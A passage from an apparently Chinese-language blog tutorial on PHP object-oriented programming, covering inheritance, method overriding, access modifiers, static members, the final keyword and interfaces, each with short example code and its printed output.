+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">class human&#123;    //创建一个human父类</span><br><span class="line">    public $name;</span><br><span class="line">    public function say()&#123;</span><br><span class="line">        echo &quot;父亲说话的方法，姓名：&quot; . $this-&gt;name.&quot;\n&quot;;</span><br><span class="line">    &#125;</span><br><span class="line">    public function eat()&#123;</span><br><span class="line">        echo &quot;父亲吃饭的方法\n&quot;;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">class sport extends human&#123;   //这里sport继承了human，sport为子类,human为父类</span><br><span class="line">    public $type;</span><br><span class="line">    public function __construct($name,$type)&#123;</span><br><span class="line">        $this-&gt;name=$name;</span><br><span class="line">        $this-&gt;type=$type;</span><br><span class="line">    &#125;</span><br><span class="line">    public function run()&#123;</span><br><span class="line">        $this-&gt;say();</span><br><span class="line">        echo &quot;我正在跑步，我是一名&quot; . $this-&gt;type . &quot;运动员\n&quot;;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">class host extends human&#123;  //这里host继承了human，host为子类,human为父类</span><br><span class="line">    public $tele;</span><br><span class="line">    public function __construct($name,$tele)</span><br><span class="line">    &#123;</span><br><span class="line">        $this-&gt;name=$name;</span><br><span class="line">        $this-&gt;tele=$tele;</span><br><span class="line">    &#125;</span><br><span class="line">    public function perform()&#123;</span><br><span class="line">        $this-&gt;eat();</span><br><span class="line">        echo &quot;我正在表演一个节目，我是&quot;.$this-&gt;tele.&quot;电视台的主持人\n&quot;;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">$nba=new sport(&quot;乔丹&quot;,&quot;篮球&quot;);</span><br><span class="line">$nba-&gt;run();</span><br><span class="line">$tv=new host(&quot;张三&quot;,&quot;北京卫视&quot;);</span><br><span class="line">$tv-&gt;perform();</span><br></pre></td></tr></table></figure>
+
+<p>输出</p>
+<p>父亲说话的方法，姓名：乔丹 我正在跑步，我是一名篮球运动员 父亲吃饭的方法 我正在表演一个节目，我是北京卫视电视台的主持人</p>
+<h4 id="2-方法重写"><a href="#2-方法重写" class="headerlink" title="2.方法重写"></a>2.方法重写</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">class human&#123;</span><br><span class="line">    public function say()&#123;</span><br><span class="line">        echo &quot;父类说话的方法&quot;;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">class sport extends human&#123;</span><br><span class="line">    public function say()  //在子类中再次声明一个say方法，这样可以覆盖父类中的say方法</span><br><span class="line">    &#123;</span><br><span class="line">        echo &quot;子类说话的方法&quot;;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">$h=new sport();</span><br><span class="line">$h-&gt;say();</span><br></pre></td></tr></table></figure>
+
+<p>输出   子类说话的方法</p>
+<h4 id="3-访问控制"><a href="#3-访问控制" class="headerlink" title="3.访问控制"></a>3.访问控制</h4><p>public关键字:定义公共的成员属性或方法，任何地方都可使用</p>
+<p>protected关键字:定义受保护的成员属性或方法，只允许类本身或子类使用</p>
+<p>private关键字:定义私有的成员属性或方法，只允许类的本身使用</p>
+<h4 id="4-静态"><a href="#4-静态" class="headerlink" title="4.静态"></a>4.静态</h4><p>static关键字</p>
+<ul>
+<li>静态属性用于保存类的公有数据；</li>
+<li>静态方法里面只能访问静态属性或方法，<strong>不能使用 $this 伪变量</strong>；</li>
+<li>静态成员<strong>不需要通过 new 关键字来实例化对象</strong>就可访问使用；</li>
+</ul>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">class human&#123;</span><br><span class="line">    static $name=&quot;张三&quot;;</span><br><span class="line">    static function say()&#123;</span><br><span class="line">        echo &quot;我的名字叫:&quot;.self::$name;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">echo human::$name;   //以此来调用静态属性$name</span><br><span class="line">human::say();   //以此来使用静态方法say</span><br></pre></td></tr></table></figure>
+
+<p>输出 张三我的名字叫:张三</p>
+<h4 id="5-final关键字"><a href="#5-final关键字" class="headerlink" title="5.final关键字"></a>5.final关键字</h4><p>不允许成员方法被重写，不允许被继承</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">class human&#123;</span><br><span class="line">    final public function eat()&#123;   //这样这个eat方法子类将不能使用</span><br><span class="line">        echo &quot;父亲吃饭的方法，不允许子类重写&quot;;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">final class sport extends human&#123;  //这样sport不能再创建子类</span><br><span class="line">    public function eat()&#123;</span><br><span class="line">        echo &quot;子类吃饭的方法，此时程序将会报致命错误&quot;;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">class student extends sport&#123;  //这里继承了sport类会报错</span><br><span class="line">    public $name;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$h=new sport();</span><br><span class="line">$h-&gt;eat();</span><br><span class="line"></span><br><span class="line">$j=new student();</span><br><span class="line">$j-&gt;name=&quot;张三&quot;;</span><br></pre></td></tr></table></figure>
+
+<p>上面输出的结果会报错</p>
+<h4 id="6-接口"><a href="#6-接口" class="headerlink" title="6.接口"></a>6.接口</h4><p>定义接口关键字：interface</p>
+<p>实现接口方法关键字：implements</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">interface caneat&#123;   //定义一个接口</span><br><span class="line">    public function eat($food);</span><br><span class="line">&#125;</span><br><span class="line">class human implements caneat&#123;   //连接接口</span><br><span class="line">    public function eat($food)&#123;</span><br><span class="line">        echo &quot;我吃：&quot;.$food;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">class animal implements caneat&#123;  //连接接口</span><br><span class="line">    public function eat($food)</span><br><span class="line">    &#123;</span><br><span class="line">        echo &quot;我吃:&quot;.$food;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">$people=new human();</span><br><span class="line">$people-&gt;eat(&#x27;rice&#x27;);</span><br><span class="line"></span><br><span class="line">$monkey=new animal();</span><br><span class="line">$monkey-&gt;eat(&#x27;banana&#x27;);</span><br></pre></td></tr></table></figure>
+
+<p>输出</p>
+<p>我吃：rice我吃:banana</p>
 ]]></content>
   </entry>
   <entry>
